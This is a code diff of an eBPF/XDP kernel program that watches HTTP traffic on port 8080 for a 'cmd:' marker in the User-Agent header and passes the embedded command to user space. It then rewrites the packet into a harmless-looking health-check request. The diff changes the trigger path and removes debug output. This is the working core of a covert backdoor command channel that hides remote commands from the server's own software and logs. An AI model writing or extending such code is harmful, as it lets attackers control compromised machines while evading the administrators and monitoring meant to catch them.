@@ -24,13 +24,11 @@ int handle_xdp(struct xdp_md *ctx) {
     // Host: 127.0.0.1:8080\r\n
     // User-Agent: curl/7.81.0 cmd:test\r\n
     // Accept: */*\r\n
-    char keyword[] = "GET /healthz HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nUser-Agent: curl/7.81.0 cmd:";
+    char keyword[] = "GET /route-1 HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nUser-Agent: curl/7.81.0 cmd:";
     int keyword_size = 73;
     char cmd_len = 20;
     char replace[] = "GET /healthz HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nUser-Agent: curl/7.81.0\r\nCache-Control: no-cache";
     char replace_size = 93;
-//    char keyword[] = "!!!CMD:";
-//    int keyword_size = 7;
     int target_port = 8080;
 
     // 通过指针操作解析数据包
@@ -85,19 +83,13 @@ int handle_xdp(struct xdp_md *ctx) {
 
     bpf_probe_read_kernel(&event->payload, sizeof(event->payload), payload);
 
-//    bpf_printk("tcp: %x:%d ->", event->src_addr, event->src_port);
-//    bpf_printk("tcp: %x:%d ", event->dest_addr, event->dest_port);
-//    bpf_printk("tcp: payload: %s", event->payload);
-
     bpf_perf_event_output(ctx, &events, BPF_F_CURRENT_CPU, event, sizeof(*event));
 
-    // 更新数据包
+    // 将数据包替换为正常的健康检查流量
 #pragma unroll
     for (int i = 0; i < replace_size; i++) {
         payload[i] = replace[i];
     }
-
-
 
     return XDP_PASS;
 }
